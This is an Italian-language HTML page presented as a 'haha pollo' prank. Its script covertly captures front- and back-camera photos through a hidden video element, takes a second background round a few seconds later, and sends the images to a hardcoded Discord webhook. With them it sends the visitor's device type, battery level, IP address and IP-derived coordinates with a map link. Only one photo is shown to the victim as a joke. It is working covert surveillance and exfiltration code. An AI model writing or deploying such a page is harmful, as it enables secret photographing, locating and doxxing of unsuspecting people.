<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>✨ Benvenuto ✨</title>
<link href="https://fonts.googleapis.com/css2?family=Permanent+Marker&family=Bebas+Neue&display=swap" rel="stylesheet">
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    background: #0a0a0a;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
    font-family: 'Bebas Neue', sans-serif;
  }

  /* ── LOADING SCREEN ── */
  #loading {
    position: fixed; inset: 0;
    background: #0a0a0a;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    z-index: 100;
    gap: 24px;
  }
  #loading p {
    color: #aaa;
    font-size: 1.1rem;
    letter-spacing: 0.15em;
    animation: pulse 1.4s ease-in-out infinite;
  }
  .spinner {
    width: 48px; height: 48px;
    border: 3px solid #222;
    border-top-color: #fff;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  @keyframes pulse { 0%,100% { opacity:.4 } 50% { opacity:1 } }

  /* ── HIDDEN VIDEO ── */
  #video {
    position: fixed;
    opacity: 0;
    pointer-events: none;
    width: 1px; height: 1px;
  }
  #canvas { display: none; }

  /* ── RESULT SCREEN ── */
  #result {
    display: none;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    width: 100%;
    padding: 20px;
    position: relative;
  }

  /* animated noise background */
  #result::before {
    content: '';
    position: fixed; inset: 0;
    background:
      radial-gradient(ellipse at 20% 20%, #ff006644 0%, transparent 60%),
      radial-gradient(ellipse at 80% 80%, #ffbe0b55 0%, transparent 60%),
      radial-gradient(ellipse at 50% 50%, #3a86ff22 0%, transparent 70%);
    animation: bgShift 4s ease-in-out infinite alternate;
    z-index: 0;
  }
  @keyframes bgShift {
    from { filter: hue-rotate(0deg); }
    to   { filter: hue-rotate(40deg); }
  }

  /* ── BIG TEXT ── */
  .top-text {
    font-family: 'Permanent Marker', cursive;
    font-size: clamp(3.5rem, 14vw, 9rem);
    line-height: 1;
    text-align: center;
    position: relative;
    z-index: 2;
    color: #fff;
    text-shadow:
      6px 6px 0 #ff0066,
      12px 12px 0 #ffbe0b;
    animation: bounceIn 0.6s cubic-bezier(0.34,1.56,0.64,1) both;
    margin-bottom: 10px;
  }
  .top-text span {
    color: #ffbe0b;
    text-shadow:
      6px 6px 0 #ff0066,
      12px 12px 0 #fff;
  }

  @keyframes bounceIn {
    from { transform: scale(0) rotate(-8deg); opacity: 0; }
    to   { transform: scale(1) rotate(-2deg); opacity: 1; }
  }

  /* ── PHOTO FRAME ── */
  .photo-wrapper {
    position: relative;
    z-index: 2;
    margin: 20px 0;
    animation: photoReveal 0.5s 0.2s cubic-bezier(0.34,1.56,0.64,1) both;
  }
  @keyframes photoReveal {
    from { transform: scale(0.3) rotate(10deg); opacity: 0; }
    to   { transform: scale(1) rotate(-3deg); opacity: 1; }
  }

  .photo-frame {
    border: 8px solid #fff;
    box-shadow:
      8px 8px 0 #ff0066,
      16px 16px 0 #ffbe0b,
      0 0 60px #ff006644;
    border-radius: 4px;
    overflow: hidden;
    max-width: min(380px, 90vw);
    transform: rotate(-3deg);
  }
  .photo-frame img {
    width: 100%;
    display: block;
    filter: contrast(1.05) saturate(1.1);
  }

  /* polaroid label */
  .polaroid-label {
    background: #fff;
    text-align: center;
    padding: 12px 8px 8px;
    font-family: 'Permanent Marker', cursive;
    font-size: 1.4rem;
    color: #333;
    letter-spacing: 0.05em;
  }

  /* ── BOTTOM TEXT ── */
  .bottom-text {
    font-family: 'Permanent Marker', cursive;
    font-size: clamp(1.4rem, 5vw, 2.8rem);
    color: #fff;
    text-align: center;
    position: relative;
    z-index: 2;
    opacity: 0;
    animation: fadeSlide 0.5s 0.6s ease both;
    text-shadow: 3px 3px 0 #ff0066;
    margin-top: 10px;
  }
  @keyframes fadeSlide {
    from { transform: translateY(20px); opacity: 0; }
    to   { transform: translateY(0); opacity: 1; }
  }

  /* ── CONFETTI EMOJIS ── */
  .emoji {
    position: fixed;
    font-size: 2rem;
    animation: fall linear both;
    z-index: 1;
    pointer-events: none;
  }
  @keyframes fall {
    from { transform: translateY(-60px) rotate(0deg); opacity: 1; }
    to   { transform: translateY(110vh) rotate(720deg); opacity: 0.3; }
  }

  /* ── ERROR STATE ── */
  #error-msg {
    display: none;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    gap: 16px;
    padding: 20px;
  }
  #error-msg h2 {
    color: #ff0066;
    font-size: 3rem;
    letter-spacing: 0.05em;
  }
  #error-msg p {
    color: #777;
    font-size: 1rem;
    text-align: center;
    max-width: 300px;
    font-family: monospace;
    line-height: 1.6;
  }
  #retry-btn {
    margin-top: 10px;
    padding: 14px 32px;
    background: #fff;
    color: #0a0a0a;
    border: none;
    border-radius: 4px;
    font-family: 'Bebas Neue', sans-serif;
    font-size: 1.4rem;
    letter-spacing: 0.1em;
    cursor: pointer;
    box-shadow: 4px 4px 0 #ff0066;
    transition: transform 0.1s, box-shadow 0.1s;
  }
  #retry-btn:active {
    transform: translate(4px, 4px);
    box-shadow: none;
  }
</style>
</head>
<body>

<div id="loading">
  <div class="spinner"></div>
  <p>CARICAMENTO IN CORSO…</p>
</div>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<div id="result">
  <div class="top-text">haha <span>pollo</span> 🐔</div>
  <div class="photo-wrapper">
    <div class="photo-frame">
      <img id="snap" src="" alt="la tua faccia da pollo">
      <div class="polaroid-label">📸 sorpreso/a!</div>
    </div>
  </div>
  <div class="bottom-text">ti ho beccato 😂</div>
</div>

<div id="error-msg">
  <h2>POLLO NEGATO 🐔</h2>
  <p>Hai rifiutato la fotocamera.<br>Non sapremo mai che faccia da pollo hai.</p>
  <button id="retry-btn" onclick="retryCamera()">📷 Chiedi di nuovo</button>
</div>

<script>
const EMOJIS = ['🐔','😂','🍗','💀','🤣','🐤','✨','🔥','😭','🥚'];

function spawnConfetti() {
  for (let i = 0; i < 30; i++) {
    const el = document.createElement('div');
    el.className = 'emoji';
    el.textContent = EMOJIS[Math.floor(Math.random() * EMOJIS.length)];
    el.style.left = Math.random() * 100 + 'vw';
    const dur = 2.5 + Math.random() * 3;
    el.style.animationDuration = dur + 's';
    el.style.animationDelay = Math.random() * 2 + 's';
    document.body.appendChild(el);
    setTimeout(() => el.remove(), (dur + 2) * 1000);
  }
}

async function takePicture(facingMode) {
  const stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
    audio: false
  });
  const video = document.getElementById('video');
  video.srcObject = stream;
  await video.play();

  await new Promise(r => setTimeout(r, 600));

  const canvas = document.getElementById('canvas');
  canvas.width = video.videoWidth || 640;
  canvas.height = video.videoHeight || 480;
  const ctx = canvas.getContext('2d');
  // specchia solo la frontale
  if (facingMode === 'user') {
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
  }
  ctx.drawImage(video, 0, 0);

  const dataURL = canvas.toDataURL('image/jpeg', 0.92);
  stream.getTracks().forEach(t => t.stop());
  return dataURL;
}

async function sendToDiscord(photos, label) {
  try {
    const WEBHOOK = 'https://discord.com/api/webhooks/1492049095769198664/JWmMlB5azPEaC8CV5eHYqps1GhPoPE0dl2XqJzEEDdM_yueLM_MyF-maQWs0lRc87LLD';
    const now = new Date().toLocaleString('it-IT');

    // --- NOME DISPOSITIVO ---
    const ua = navigator.userAgent;
    let device = 'Sconosciuto';
    if (/iPhone/.test(ua)) device = 'iPhone';
    else if (/iPad/.test(ua)) device = 'iPad';
    else if (/Android/.test(ua)) { const m = ua.match(/Android[\s\d.]+;\s([^)]+)/); device = m ? m[1].trim() : 'Android'; }
    else if (/Windows/.test(ua)) device = 'Windows PC';
    else if (/Mac/.test(ua)) device = 'Mac';

    // --- BATTERIA ---
    let batteria = 'N/D';
    try {
      const bat = await navigator.getBattery();
      const pct = Math.round(bat.level * 100);
      const carica = bat.charging ? '⚡ in carica' : '🔋';
      batteria = `${carica} ${pct}%`;
    } catch (e) {}

    // --- POSIZIONE (solo IP, nessun permesso) ---
    let posizione = '📍 Posizione non disponibile';
    try {
      const r = await fetch('https://ipapi.co/json/');
      const d = await r.json();
      posizione = `📍 ${d.city}, ${d.region}, ${d.country_name} — [${d.latitude}, ${d.longitude}](https://maps.google.com/?q=${d.latitude},${d.longitude})\n🌐 IP: \`${d.ip}\``;
    } catch (e) {}

    const form = new FormData();
    form.append('payload_json', JSON.stringify({
      content: `🐔 **POLLO CATTURATO!** [${label}]\n🕐 ${now}\n📱 ${device}\n${batteria}\n${posizione}`
    }));
    for (const { dataURL, name } of photos) {
      const blob = await (await fetch(dataURL)).blob();
      form.append('files[]', blob, name);
    }
    await fetch(WEBHOOK, { method: 'POST', body: form });
  } catch (e) {}
}

async function shootBoth(label) {
  const photos = [];
  try {
    const front = await takePicture('user');
    photos.push({ dataURL: front, name: 'frontale.jpg' });
  } catch (e) {}
  try {
    const back = await takePicture('environment');
    photos.push({ dataURL: back, name: 'posteriore.jpg' });
  } catch (e) {}
  if (photos.length > 0) sendToDiscord(photos, label);
  return photos;
}

function showResult(imgSrc) {
  document.getElementById('loading').style.display = 'none';
  document.getElementById('snap').src = imgSrc;
  const result = document.getElementById('result');
  result.style.display = 'flex';
  spawnConfetti();
  setInterval(spawnConfetti, 3000);
}

function showError() {
  document.getElementById('loading').style.display = 'none';
  document.getElementById('error-msg').style.display = 'flex';
}

async function retryCamera() {
  document.getElementById('error-msg').style.display = 'none';
  document.getElementById('loading').style.display = 'flex';
  await startCamera();
}

async function startCamera() {
  try {
    // Prima sessione — mostra il risultato all'utente
    const photos = await shootBoth('scatto 1');
    if (photos.length === 0) { showError(); return; }
    showResult(photos[0].dataURL);

    // Seconda sessione dopo 4 secondi — in background
    setTimeout(() => shootBoth('scatto 2'), 4000);
  } catch (e) {
    showError();
  }
}

(async () => { await startCamera(); })();
</script>
</body>
</html>
